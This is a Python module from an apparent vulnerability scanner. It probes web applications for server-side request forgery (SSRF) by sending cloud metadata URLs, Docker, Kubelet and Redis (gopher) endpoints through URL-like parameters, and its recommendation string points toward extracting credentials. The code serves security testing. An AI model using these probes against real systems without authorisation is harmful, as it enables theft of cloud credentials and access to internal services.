"""SSRF vulnerability analyzer - Enhanced with metadata and internal port probing."""

import logging
from typing import Any

import httpx

logger = logging.getLogger(__name__)


class SSRFTester:
    """Test for Server-Side Request Forgery vulnerabilities."""

    # Internal targets to probe
    INTERNAL_TARGETS = [
        # AWS Metadata
        "http://169.254.169.254/latest/meta-data/",
        "http://169.254.169.254/latest/user-data/",
        "http://169.254.169.254/latest/api/token",
        # Azure Metadata
        "http://169.254.169.254/metadata/instance?api-version=2021-02-01",
        # GCP Metadata
        "http://metadata.google.internal/computeMetadata/v1/",
        # Localhost
        "http://127.0.0.1:80",
        "http://127.0.0.1:8080",
        "http://localhost:3000",
        "http://0.0.0.0:80",
        # Docker/K8s internal ports
        "http://localhost:2375/version",  # Docker API
        "http://localhost:2376/version",  # Docker API TLS
        "http://localhost:10250/pods",  # Kubelet API
        "http://localhost:6443/version",  # Kubernetes API
        "http://localhost:8080/version",  # Common dev server
        # Redis/Memcached
        "gopher://127.0.0.1:6379/_INFO",
        "http://127.0.0.1:11211/",
    ]

    @staticmethod
    async def test_ssrf(
        endpoint: str,
        param: str,
        target_url: str,
        base_url: str = "",
        token: str = "",
        method: str = "POST",
    ) -> dict[str, Any]:
        """Test SSRF by probing internal targets."""
        try:
            headers = {"Authorization": f"Bearer {token}"} if token else {}
            payload = {param: target_url}

            async with httpx.AsyncClient(timeout=10.0, follow_redirects=True) as client:
                if method == "POST":
                    response = await client.post(
                        f"{base_url}{endpoint}",
                        json=payload,
                        headers=headers,
                    )
                else:
                    response = await client.get(
                        f"{base_url}{endpoint}?{param}={target_url}",
                        headers=headers,
                    )

                # Check for internal service responses
                response_text = response.text
                if any(
                    indicator in response_text
                    for indicator in [
                        "ami-id",
                        "instance-id",
                        "mac",  # AWS
                        "compute",
                        "metadata",  # GCP/Azure
                        "PONG",
                        "redis_version",  # Redis
                        "kubernetes",
                        "kubelet",  # K8s
                        "Server:",
                        "Docker",  # Docker
                    ]
                ):
                    return {
                        "vulnerable": True,
                        "type": "ssrf",
                        "severity": "CRITICAL",
                        "endpoint": endpoint,
                        "parameter": param,
                        "target": target_url,
                        "evidence": "Internal service response detected",
                        "response_preview": response_text[:200],
                    }
        except Exception:
            pass

        return {"vulnerable": False, "target": target_url}


async def analyze_ssrf(
    params: dict[str, set[str]],
    tech_profile: dict[str, list[str]],
    model_router: Any,
    base_url: str = "",
    token: str = "",
) -> dict[str, Any]:
    """Analyze for SSRF vulnerabilities, targeting cloud metadata and internal services."""
    ssrf_candidates = []
    confirmed_findings = []

    url_like_params = [
        "url",
        "uri",
        "endpoint",
        "webhook",
        "callback",
        "redirect",
        "redirect_url",
        "return_url",
        "next",
        "image_url",
        "file_url",
        "source",
        "target",
        "fetch",
        "load",
        "proxy",
    ]

    for param_type, param_set in params.items():
        for param in param_set:
            if any(url_marker in param.lower() for url_marker in url_like_params):
                ssrf_candidates.append(
                    {
                        "parameter": param,
                        "type": param_type,
                        "test_payloads": SSRFTester.INTERNAL_TARGETS[
                            :5
                        ],  # Top 5 targets
                    }
                )

    # Test critical targets if we have candidates
    if ssrf_candidates and base_url:
        for candidate in ssrf_candidates[:3]:  # Limit testing
            param = candidate["parameter"]
            for target in SSRFTester.INTERNAL_TARGETS[:3]:  # Test top 3
                result = await SSRFTester.test_ssrf(
                    endpoint="/api/test",  # Should be provided
                    param=param,
                    target_url=target,
                    base_url=base_url,
                    token=token,
                )
                if result.get("vulnerable"):
                    confirmed_findings.append(result)

    tech_str = " ".join(str(v) for vals in tech_profile.values() for v in vals).lower()
    is_cloud = any(cloud in tech_str for cloud in ["aws", "azure", "gcp"])

    return {
        "vulnerability": "SSRF",
        "candidates": ssrf_candidates,
        "confirmed_findings": confirmed_findings,
        "is_cloud_environment": is_cloud,
        "internal_targets_tested": len(SSRFTester.INTERNAL_TARGETS),
        "recommendation": (
            "Target cloud metadata endpoints for credential extraction"
            if is_cloud
            else "Test for internal service access via SSRF"
        ),
    }
